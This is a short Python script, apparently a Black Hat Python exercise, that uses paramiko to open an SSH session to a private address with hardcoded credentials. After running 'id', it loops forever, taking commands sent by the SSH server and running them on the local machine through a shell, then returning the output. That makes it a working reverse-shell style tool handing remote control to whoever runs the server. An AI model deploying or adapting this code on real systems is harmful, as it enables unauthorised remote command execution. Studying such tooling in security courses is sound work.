#!/usr/bin/env python
# coding: utf-8
# @File Name: bh_sshcmd.py
# @Author: Joshua Liu
# @Email: liuchaozhenyu@gmail.com
# @Create Date: 2018-04-04 13:04:24
# @Last Modified: 2018-04-04 13:04:48
# @Description:
#   使用 paramiko 完成 ssh 命令的功能
import threading
import paramiko
import subprocess


def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    # client.load_host_keys('~/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.exec_command(command)
        print(ssh_session.recv(1024))

        while True:
            # get the command from the SSH server
            command = ssh_session.recv(1024)
            try:
                cmd_out = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_out)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return


if __name__ == '__main__':
    ssh_command('10.0.11.206', 'joshua', 'joshua', 'id')
